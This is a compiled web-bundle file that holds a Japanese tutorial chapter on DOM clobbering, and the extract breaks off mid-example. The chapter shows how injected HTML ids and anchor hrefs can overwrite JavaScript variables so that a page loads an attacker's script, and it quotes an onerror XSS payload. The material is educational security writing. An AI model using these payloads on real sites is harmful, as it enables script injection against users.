"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[747],{3905:(e,n,t)=>{t.d(n,{Zo:()=>m,kt:()=>k});var l=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);n&&(l=l.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,l)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function r(e,n){if(null==e)return{};var t,l,a=function(e,n){if(null==e)return{};var t,l,a={},i=Object.keys(e);for(l=0;l<i.length;l++)t=i[l],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(l=0;l<i.length;l++)t=i[l],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var p=l.createContext({}),c=function(e){var n=l.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},m=function(e){var n=c(e.components);return l.createElement(p.Provider,{value:n},e.children)},d="mdxType",s={inlineCode:"code",wrapper:function(e){var n=e.children;return l.createElement(l.Fragment,{},n)}},u=l.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,p=e.parentName,m=r(e,["components","mdxType","originalType","parentName"]),d=c(t),u=a,k=d["".concat(p,".").concat(u)]||d[u]||s[u]||i;return t?l.createElement(k,o(o({ref:n},m),{},{components:t})):l.createElement(k,o({ref:n},m))}));function k(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=u;var r={};for(var p in n)hasOwnProperty.call(n,p)&&(r[p]=n[p]);r.originalType=e,r[d]="string"==typeof e?e:a,o[1]=r;for(var c=2;c<i;c++)o[c]=t[c];return l.createElement.apply(null,o)}return l.createElement.apply(null,t)}u.displayName="MDXCreateElement"},4020:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>o,default:()=>s,frontMatter:()=>i,metadata:()=>r,toc:()=>c});var l=t(7462),a=(t(7294),t(3905));const i={sidebar_position:15},o="HTML\u3082JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\uff1fDOM clobbering\u5165\u9580",r={unversionedId:"ch3/dom-clobbering",id:"ch3/dom-clobbering",title:"HTML\u3082JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\uff1fDOM clobbering\u5165\u9580",description:"\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u6c5a\u67d3\u306e\u3088\u3046\u306a\u8106\u5f31\u6027\u3092\u4ecb\u3057\u3066JavaScript\u306e\u5b9f\u884c\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u306b\u52a0\u3048\u3066\u3001HTML\u3082JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3053\u3068\u3092\u3054\u5b58\u77e5\u3067\u3057\u305f\u304b\uff1f",source:"@site/i18n/ja/docusaurus-plugin-content-docs/current/ch3/15-dom-clobbering.md",sourceDirName:"ch3",slug:"/ch3/dom-clobbering",permalink:"/beyond-xss/ja/ch3/dom-clobbering",draft:!1,tags:[],version:"current",sidebarPosition:15,frontMatter:{sidebar_position:15},sidebar:"tutorialSidebar",previous:{title:"\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u30c1\u30a7\u30fc\u30f3\u3092\u60aa\u7528\u3057\u305f\u653b\u6483\uff1aPrototype Pollution",permalink:"/beyond-xss/ja/ch3/prototype-pollution"},next:{title:"\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u306e\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u653b\u6483\uff1aCSTI",permalink:"/beyond-xss/ja/ch3/csti"}},p={},c=[{value:"DOM\u3068window\u306e\u91cf\u5b50\u3082\u3064\u308c",id:"dom\u3068window\u306e\u91cf\u5b50\u3082\u3064\u308c",level:2},{value:"DOM clobbering\u5165\u9580",id:"dom-clobbering\u5165\u9580",level:2},{value:"\u30cd\u30b9\u30c8\u3055\u308c\u305fDOM Clobbering",id:"\u30cd\u30b9\u30c8\u3055\u308c\u305fdom-clobbering",level:2},{value:"\u3055\u3089\u306b\u30cd\u30b9\u30c8\u3055\u308c\u305fDOM Clobbering",id:"\u3055\u3089\u306b\u30cd\u30b9\u30c8\u3055\u308c\u305fdom-clobbering",level:2},{value:"document\u3092\u4ecb\u3057\u305f\u653b\u6483\u5bfe\u8c61\u306e\u62e1\u5927",id:"document\u3092\u4ecb\u3057\u305f\u653b\u6483\u5bfe\u8c61\u306e\u62e1\u5927",level:2},{value:"\u4e8b\u4f8b\u7814\u7a76\uff1aGmail AMP4Email XSS",id:"\u4e8b\u4f8b\u7814\u7a76gmail-amp4email-xss",level:2},{value:"\u307e\u3068\u3081",id:"\u307e\u3068\u3081",level:2}],m={toc:c},d="wrapper";function s(e){let{components:n,...i}=e;return(0,a.kt)(d,(0,l.Z)({},m,i,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"html\u3082javascript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308bdom-clobbering\u5165\u9580"},"HTML\u3082JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\uff1fDOM clobbering\u5165\u9580"),(0,a.kt)("p",null,"\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u6c5a\u67d3\u306e\u3088\u3046\u306a\u8106\u5f31\u6027\u3092\u4ecb\u3057\u3066JavaScript\u306e\u5b9f\u884c\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u306b\u52a0\u3048\u3066\u3001HTML\u3082JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3053\u3068\u3092\u3054\u5b58\u77e5\u3067\u3057\u305f\u304b\uff1f"),(0,a.kt)("p",null,"JavaScript\u304cDOM API\u3092\u4f7f\u7528\u3057\u3066HTML\u3092\u64cd\u4f5c\u3067\u304d\u308b\u3053\u3068\u306f\u8ab0\u3082\u304c\u77e5\u3063\u3066\u3044\u307e\u3059\u3002\u3057\u304b\u3057\u3001HTML\u306f\u3069\u306e\u3088\u3046\u306bJavaScript\u306e\u5b9f\u884c\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u306e\u3067\u3057\u3087\u3046\u304b\uff1f\u305d\u3053\u304c\u8208\u5473\u6df1\u3044\u3068\u3053\u308d\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u672c\u683c\u7684\u306b\u59cb\u3081\u308b\u524d\u306b\u3001\u3061\u3087\u3063\u3068\u3057\u305f\u697d\u3057\u3044\u8ab2\u984c\u304b\u3089\u59cb\u3081\u307e\u3057\u3087\u3046\u3002"),(0,a.kt)("p",null,"\u30dc\u30bf\u30f3\u3068\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u542b\u3080\u6b21\u306e\u30b3\u30fc\u30c9\u30b9\u30cb\u30da\u30c3\u30c8\u304c\u3042\u308b\u3068\u3057\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>\n\n<body>\n  <button id="btn">click me</button>\n  <script>\n    // TODO: \u30dc\u30bf\u30f3\u306b\u30af\u30ea\u30c3\u30af\u30a4\u30d9\u30f3\u30c8\u30ea\u30b9\u30ca\u30fc\u3092\u8ffd\u52a0\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3055\u3066\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<script>")," \u30bf\u30b0\u5185\u3067\u300c\u30dc\u30bf\u30f3\u304c\u30af\u30ea\u30c3\u30af\u3055\u308c\u305f\u3068\u304d\u306b ",(0,a.kt)("inlineCode",{parentName:"p"},"alert(1)")," \u3092\u8868\u793a\u3059\u308b\u300d\u6a5f\u80fd\u3092\u300c\u53ef\u80fd\u306a\u9650\u308a\u77ed\u3044\u30b3\u30fc\u30c9\u300d\u3067\u5b9f\u88c5\u3057\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002"),(0,a.kt)("p",null,"\u4f8b\u3048\u3070\u3001\u6b21\u306e\u30b3\u30fc\u30c9\u306f\u76ee\u6a19\u3092\u9054\u6210\u3057\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"document.getElementById('btn')\n  .addEventListener('click', () => {\n    alert(1)\n  })\n")),(0,a.kt)("p",null,"\u3067\u306f\u3001\u30b3\u30fc\u30c9\u3092\u53ef\u80fd\u306a\u9650\u308a\u77ed\u304f\u3059\u308b\u305f\u3081\u306e\u7b54\u3048\u306f\u4f55\u3067\u3057\u3087\u3046\u304b\uff1f"),(0,a.kt)("p",null,"\u5148\u306b\u9032\u3080\u524d\u306b\u3001\u5c11\u3057\u6642\u9593\u3092\u53d6\u3063\u3066\u3053\u306e\u8cea\u554f\u306b\u3064\u3044\u3066\u8003\u3048\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u7b54\u3048\u304c\u601d\u3044\u3064\u3044\u305f\u3089\u3001\u5148\u306b\u9032\u307f\u307e\u3057\u3087\u3046\uff01"),(0,a.kt)("p",null,"\u30cd\u30bf\u30d0\u30ec\u6ce8\u610f\uff1a\n.",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".  "),(0,a.kt)("h2",{id:"dom\u3068window\u306e\u91cf\u5b50\u3082\u3064\u308c"},"DOM\u3068window\u306e\u91cf\u5b50\u3082\u3064\u308c"),(0,a.kt)("p",null,"DOM\u5185\u306e\u8981\u7d20\u304c ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u53ef\u80fd\u6027\u304c\u3042\u308b\u3053\u3068\u3092\u3054\u5b58\u77e5\u3067\u3057\u305f\u304b\uff1f"),(0,a.kt)("p",null,"\u6570\u5e74\u524d\u306bFacebook\u306e\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u30b3\u30df\u30e5\u30cb\u30c6\u30a3\u3067\u5076\u7136\u3053\u306e\u52d5\u4f5c\u3092\u77e5\u308a\u307e\u3057\u305f\u3002HTML\u3067 ",(0,a.kt)("inlineCode",{parentName:"p"},"id")," \u3092\u6301\u3064\u8981\u7d20\u3092\u5b9a\u7fa9\u3059\u308b\u3068\u3001JavaScript\u3067\u76f4\u63a5\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3053\u3068\u304c\u308f\u304b\u308a\u307e\u3057\u305f\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<button id="btn">click me</button>\n<script>\n  console.log(window.btn) // <button id="btn">click me</button>\n<\/script>\n')),(0,a.kt)("p",null,"\u305d\u3057\u3066\u3001\u30b9\u30b3\u30fc\u30d7\u306e\u304a\u304b\u3052\u3067\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"btn")," \u3060\u3051\u3067\u76f4\u63a5\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3053\u3068\u3082\u3067\u304d\u307e\u3059\u3002\u73fe\u5728\u306e\u30b9\u30b3\u30fc\u30d7\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u3092\u898b\u3064\u3051\u308b\u307e\u3067\u4e0a\u5411\u304d\u306b\u691c\u7d22\u3059\u308b\u305f\u3081\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u524d\u306e\u8cea\u554f\u306e\u7b54\u3048\u306f\u6b21\u306e\u3068\u304a\u308a\u3067\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"btn.onclick=()=>alert(1)\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"getElementById")," \u3082 ",(0,a.kt)("inlineCode",{parentName:"p"},"querySelector")," \u3082\u5fc5\u8981\u3042\u308a\u307e\u305b\u3093\u3002id\u3068\u540c\u3058\u540d\u524d\u306e\u5909\u6570\u3092\u4f7f\u7528\u3057\u3066\u76f4\u63a5\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3060\u3051\u3067\u53d6\u5f97\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3053\u306e\u52d5\u4f5c\u306f\u3001",(0,a.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object"},"7.3.3 Named access on the Window object"),"\u306e\u4ed5\u69d8\u3067\u660e\u78ba\u306b\u5b9a\u7fa9\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(770).Z,width:"1408",height:"298"})),(0,a.kt)("p",null,"2\u3064\u306e\u91cd\u8981\u306a\u30dd\u30a4\u30f3\u30c8\u3092\u629c\u7c8b\u3057\u307e\u3059\u3002"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"\u7a7a\u3067\u306a\u3044name\u30b3\u30f3\u30c6\u30f3\u30c4\u5c5e\u6027\u3092\u6301\u3064\u3059\u3079\u3066\u306e ",(0,a.kt)("inlineCode",{parentName:"li"},"embed"),"\u3001",(0,a.kt)("inlineCode",{parentName:"li"},"form"),"\u3001",(0,a.kt)("inlineCode",{parentName:"li"},"img"),"\u3001\u304a\u3088\u3073 ",(0,a.kt)("inlineCode",{parentName:"li"},"object")," \u8981\u7d20\u306ename\u30b3\u30f3\u30c6\u30f3\u30c4\u5c5e\u6027\u306e\u5024"),(0,a.kt)("li",{parentName:"ol"},"\u7a7a\u3067\u306a\u3044id\u30b3\u30f3\u30c6\u30f3\u30c4\u5c5e\u6027\u3092\u6301\u3064\u3059\u3079\u3066\u306eHTML\u8981\u7d20\u306e ",(0,a.kt)("inlineCode",{parentName:"li"},"id")," \u30b3\u30f3\u30c6\u30f3\u30c4\u5c5e\u6027\u306e\u5024")),(0,a.kt)("p",null,"\u3053\u308c\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"id")," \u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u3092\u4ecb\u3057\u3066\u8981\u7d20\u306b\u76f4\u63a5\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3060\u3051\u3067\u306a\u304f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"name")," \u5c5e\u6027\u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"<embed>"),"\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<form>"),"\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<img>"),"\u3001\u304a\u3088\u3073 ",(0,a.kt)("inlineCode",{parentName:"p"},"<object>")," \u8981\u7d20\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3053\u3068\u3092\u610f\u5473\u3057\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<embed name="a"></embed>\n<form name="b"></form>\n<img name="c" />\n<object name="d"></object>\n')),(0,a.kt)("p",null,"\u3053\u306e\u4ed5\u69d8\u3092\u7406\u89e3\u3059\u308b\u3068\u3001\u6b21\u306e\u7d50\u8ad6\u304c\u5f97\u3089\u308c\u307e\u3059\u3002"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"HTML\u8981\u7d20\u3092\u4ecb\u3057\u3066JavaScript\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002")),(0,a.kt)("p",null,"\u305d\u3057\u3066\u3001\u3053\u306e\u30c6\u30af\u30cb\u30c3\u30af\u306f\u653b\u6483\u306b\u4f7f\u7528\u3067\u304d\u3001DOM clobbering\u3068\u3057\u3066\u77e5\u3089\u308c\u3066\u3044\u307e\u3059\u3002\u3053\u306e\u653b\u6483\u306e\u6587\u8108\u3067\u521d\u3081\u3066\u300cclobbering\u300d\u3068\u3044\u3046\u8a00\u8449\u306b\u51fa\u4f1a\u3044\u307e\u3057\u305f\u3002\u3055\u3089\u306b\u8abf\u3079\u305f\u3068\u3053\u308d\u3001\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30b5\u30a4\u30a8\u30f3\u30b9\u306e\u5206\u91ce\u3067\u306f\u300c\u4e0a\u66f8\u304d\u300d\u3092\u610f\u5473\u3059\u308b\u3053\u3068\u304c\u308f\u304b\u308a\u307e\u3057\u305f\u3002\u3053\u308c\u306f\u3001DOM\u3092\u4f7f\u7528\u3057\u3066\u7279\u5b9a\u306e\u8981\u7d20\u3092\u4e0a\u66f8\u304d\u3057\u3066\u653b\u6483\u3092\u9054\u6210\u3059\u308b\u3053\u3068\u3092\u6307\u3057\u307e\u3059\u3002"),(0,a.kt)("h2",{id:"dom-clobbering\u5165\u9580"},"DOM clobbering\u5165\u9580"),(0,a.kt)("p",null,"\u3069\u306e\u3088\u3046\u306a\u72b6\u6cc1\u3067DOM clobbering\u3092\u653b\u6483\u306b\u5229\u7528\u3067\u304d\u308b\u3067\u3057\u3087\u3046\u304b\uff1f"),(0,a.kt)("p",null,"\u307e\u305a\u3001\u30da\u30fc\u30b8\u306b\u30ab\u30b9\u30bf\u30e0HTML\u3092\u8868\u793a\u3059\u308b\u6a5f\u4f1a\u304c\u5fc5\u8981\u3067\u3059\u3002\u305d\u3046\u3067\u306a\u3051\u308c\u3070\u4e0d\u53ef\u80fd\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u6f5c\u5728\u7684\u306a\u653b\u6483\u30b7\u30ca\u30ea\u30aa\u306f\u6b21\u306e\u3088\u3046\u306b\u306a\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},"<!DOCTYPE html>\n<html>\n<body>\n  <h1>\u30b3\u30e1\u30f3\u30c8</h1>\n  <div>\n    \u3042\u306a\u305f\u306e\u30b3\u30e1\u30f3\u30c8\uff1a\u3053\u3093\u306b\u3061\u306f\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // \u30c6\u30b9\u30c8\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u8aad\u307f\u8fbc\u307f\u307e\u3059\n      var script = document.createElement('script')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n")),(0,a.kt)("p",null,"\u30b3\u30e1\u30f3\u30c8\u30dc\u30fc\u30c9\u304c\u3042\u308a\u3001\u4efb\u610f\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u5165\u529b\u3067\u304d\u308b\u3068\u3057\u307e\u3059\u3002\u305f\u3060\u3057\u3001\u5165\u529b\u306f\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u30b5\u30cb\u30bf\u30a4\u30ba\u3055\u308c\u3001JavaScript\u3092\u5b9f\u884c\u3067\u304d\u308b\u3082\u306e\u306f\u3059\u3079\u3066\u524a\u9664\u3055\u308c\u307e\u3059\u3002\u3057\u305f\u304c\u3063\u3066\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<script><\/script>")," \u306f\u524a\u9664\u3055\u308c\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<img src=x onerror=alert(1)>")," \u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"onerror")," \u5c5e\u6027\u306f\u524a\u9664\u3055\u308c\u307e\u3059\u3002\u591a\u304f\u306eXSS\u30da\u30a4\u30ed\u30fc\u30c9\u306f\u901a\u904e\u3057\u307e\u305b\u3093\u3002"),(0,a.kt)("p",null,"\u8981\u3059\u308b\u306b\u3001JavaScript\u3092\u5b9f\u884c\u3057\u3066XSS\u3092\u9054\u6210\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u307e\u305b\u3093\u3002\u306a\u305c\u306a\u3089\u3001\u305d\u306e\u3088\u3046\u306a\u8a66\u307f\u306f\u3059\u3079\u3066\u30d5\u30a3\u30eb\u30bf\u30ea\u30f3\u30b0\u3055\u308c\u308b\u304b\u3089\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u305f\u3060\u3057\u3001\u3055\u307e\u3056\u307e\u306a\u8981\u56e0\u306b\u3088\u308a\u3001HTML\u30bf\u30b0\u306f\u30d5\u30a3\u30eb\u30bf\u30ea\u30f3\u30b0\u3055\u308c\u306a\u3044\u305f\u3081\u3001\u30ab\u30b9\u30bf\u30e0HTML\u3092\u8868\u793a\u3067\u304d\u307e\u3059\u3002JavaScript\u304c\u5b9f\u884c\u3055\u308c\u306a\u3044\u9650\u308a\u3001\u4efb\u610f\u306eHTML\u30bf\u30b0\u3092\u633f\u5165\u3057\u3001\u4efb\u610f\u306e\u5c5e\u6027\u3092\u8a2d\u5b9a\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u6b21\u306e\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <h1>\u30b3\u30e1\u30f3\u30c8</h1>\n  <div>\n    \u3042\u306a\u305f\u306e\u30b3\u30e1\u30f3\u30c8\uff1a<div id="TEST_MODE"></div>\n    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // \u30c6\u30b9\u30c8\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u8aad\u307f\u8fbc\u307f\u307e\u3059\n      var script = document.createElement(\'script\')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u4e0a\u8a18\u306e\u77e5\u8b58\u306b\u57fa\u3065\u3044\u3066\u3001id\u304c\u300cTEST_MODE\u300d\u306e\u30bf\u30b0 ",(0,a.kt)("inlineCode",{parentName:"p"},'<div id="TEST_MODE"></div>')," \u3092\u633f\u5165\u3067\u304d\u307e\u3059\u3002\u3053\u308c\u306b\u3088\u308a\u3001JavaScript\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"if (window.TEST_MODE)")," \u306f\u901a\u904e\u3057\u307e\u3059\u3002\u306a\u305c\u306a\u3089\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u306f\u3053\u306ediv\u8981\u7d20\u306b\u306a\u308b\u304b\u3089\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u6b21\u306b\u3001",(0,a.kt)("inlineCode",{parentName:"p"},'<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>')," \u3092\u4f7f\u7528\u3057\u3066\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_SCRIPT_SRC")," \u3092\u6587\u5b57\u5217\u306b\u5909\u63db\u3057\u305f\u5f8c\u3001\u76ee\u7684\u306e\u6587\u5b57\u5217\u306b\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u307b\u3068\u3093\u3069\u306e\u5834\u5408\u3001\u5909\u6570\u3092HTML\u8981\u7d20\u3067\u4e0a\u66f8\u304d\u3059\u308b\u3060\u3051\u3067\u306f\u5341\u5206\u3067\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u4f8b\u3048\u3070\u3001\u4e0a\u8a18\u306e\u30b3\u30fc\u30c9\u30b9\u30cb\u30da\u30c3\u30c8\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u3092\u6587\u5b57\u5217\u306b\u5909\u63db\u3057\u3066\u51fa\u529b\u3059\u308b\u3068\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"// <div id=\"TEST_MODE\" />\nconsole.log(window.TEST_MODE + '')\n")),(0,a.kt)("p",null,"\u7d50\u679c\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"[object HTMLDivElement]")," \u306b\u306a\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"HTML\u8981\u7d20\u3092\u6587\u5b57\u5217\u306b\u5909\u63db\u3059\u308b\u3068\u3001\u3053\u306e\u5f62\u5f0f\u306b\u306a\u308a\u3001\u3053\u306e\u5834\u5408\u306f\u4f7f\u7528\u3067\u304d\u307e\u305b\u3093\u3002\u3057\u304b\u3057\u5e78\u3044\u306a\u3053\u3068\u306b\u3001HTML\u306b\u306f\u6587\u5b57\u5217\u306b\u5909\u63db\u3055\u308c\u308b\u3068\u304d\u306b\u7279\u5225\u306b\u6271\u308f\u308c\u308b2\u3064\u306e\u8981\u7d20\u304c\u3042\u308a\u307e\u3059\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"<base>")," \u3068 ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>"),"\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(1832).Z,width:"799",height:"665"})),(0,a.kt)("p",null,"\u51fa\u5178\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/#api-for-a-and-area-elements"},"4.6.3 API for a and area elements")),(0,a.kt)("p",null,"\u3053\u308c\u3089\u306e2\u3064\u306e\u8981\u7d20\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u304c\u547c\u3073\u51fa\u3055\u308c\u305f\u3068\u304d\u306bURL\u3092\u8fd4\u3057\u307e\u3059\u3002href\u5c5e\u6027\u3092\u4f7f\u7528\u3057\u3066URL\u3092\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u3067\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u5f8c\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u5236\u5fa1\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u4e0a\u8a18\u306e\u30c6\u30af\u30cb\u30c3\u30af\u3092\u7d44\u307f\u5408\u308f\u305b\u308b\u3068\u3001\u6b21\u306e\u3053\u3068\u3092\u5b66\u3073\u307e\u3057\u305f\u3002"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"id\u5c5e\u6027\u3092\u6301\u3064HTML\u3092\u4f7f\u7528\u3057\u3066JavaScript\u5909\u6570\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3002"),(0,a.kt)("li",{parentName:"ol"},"href\u3068id\u3092\u6301\u3064 ",(0,a.kt)("inlineCode",{parentName:"li"},"<a>")," \u3092\u4f7f\u7528\u3057\u3066\u3001\u8981\u7d20\u306e ",(0,a.kt)("inlineCode",{parentName:"li"},"toString")," \u7d50\u679c\u3092\u76ee\u7684\u306e\u5024\u306b\u3059\u308b\u3002")),(0,a.kt)("p",null,"\u3053\u308c\u3089\u306e2\u3064\u306e\u30c6\u30af\u30cb\u30c3\u30af\u3092\u9069\u5207\u306a\u30b3\u30f3\u30c6\u30ad\u30b9\u30c8\u3067\u4f7f\u7528\u3059\u308b\u3053\u3068\u3067\u3001DOM clobbering\u3092\u60aa\u7528\u3067\u304d\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u305f\u3060\u3057\u3001\u3053\u3053\u3067\u91cd\u8981\u306a\u6ce8\u610f\u70b9\u304c\u3042\u308a\u307e\u3059\u3002\u653b\u6483\u3057\u305f\u3044\u5909\u6570\u304c\u3059\u3067\u306b\u5b58\u5728\u3059\u308b\u5834\u5408\u3001DOM\u3092\u4f7f\u7528\u3057\u3066\u4e0a\u66f8\u304d\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u307e\u305b\u3093\u3002\u4f8b\u3048\u3070\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <script>\n    TEST_MODE = 1\n  <\/script>\n</head>\n<body>\n  <div id="TEST_MODE"></div> \n  <script>\n    console.log(window.TEST_MODE) // 1\n  